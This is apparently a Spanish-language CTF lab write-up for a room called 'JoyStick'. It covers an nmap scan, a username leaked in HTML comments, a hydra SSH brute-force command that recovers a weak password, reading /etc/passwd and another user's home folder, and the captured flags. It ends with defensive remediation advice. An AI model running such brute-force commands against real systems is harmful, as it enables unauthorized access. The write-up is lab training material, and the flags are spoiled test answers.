# JoyStick
Room Sencillita ,un poco disgusting ya que es solo bruteforcing
## Initial Scan
```
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: got code 500 "OOPS: vsftpd: refusing to run with writable root inside chroot()".
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c7:ce:5d:fa:24:68:3a:10:63:f9:28:1b:f4:6d:e5:bc (RSA)
|   256 6b:7b:f5:12:e0:db:bb:b0:ca:f8:f8:c0:84:bc:27:e6 (ECDSA)
|_  256 1b:d4:20:23:d0:5b:32:16:ad:c2:a9:cd:99:1c:e6:6e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: JoyStick Gaming
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enum

### HTTP

```html
<!-- Zach, I don't care that you named your user steve. You still need to finish making the website -->
<!-- Great, and now the FTP server just doesn't work. Just another great idea after	your failed irc chat. Why would we use that when we have in game chat? 
Not to mention that I know you still haven't reset your password.  -->
```

Por lo que se ve tenemos un usuario llamado Steve con creds faciles de averiguar

### SSH

Vamos a hacerle bruteforcing
```
hydra -l steve -P rockyou.txt 10.10.101.140 -t 16 ssh
[22][ssh] host: 10.10.101.140   login: steve   password: changeme
```

Accedemos con las creds y ya tenemos acceso a la primera flag
```
flag{is_only_gaem}
```
### Privesc

```
root:x:0:0:root:/root:/bin/bash
notch:x:1000:1000:Notch,,,:/home/notch:/bin/bash
minecraft:x:1001:1001:Mine,,,:/home/minecraft:/bin/bash
```
Tras enumerar usuarios me di cuenta de qeu tenia acceso a los otros /home, en el de Notch hay un root.txt

Lo podemos leer y así conseguir la otra flag

```
flag{poorly_configured_permissions}
```
# Analisis de la intrusión
### SSH Bruteforcing allowed
No existe ningún tipo de medida para evitar ataques por fuerza bruta contra el servidor 
### Bad password police
Se ha permitido el uso de contraseñas poco seguras a los usurios lo cual ha permitido ejecutar un ataque de fuerza bruta con exito

# Soluciones
### SSH Bruteforcing allowed
Utilizar algún tipo de protección como fail2ban en el servidor sería altamaente recomendables de cara a evitar este tipo de ataques
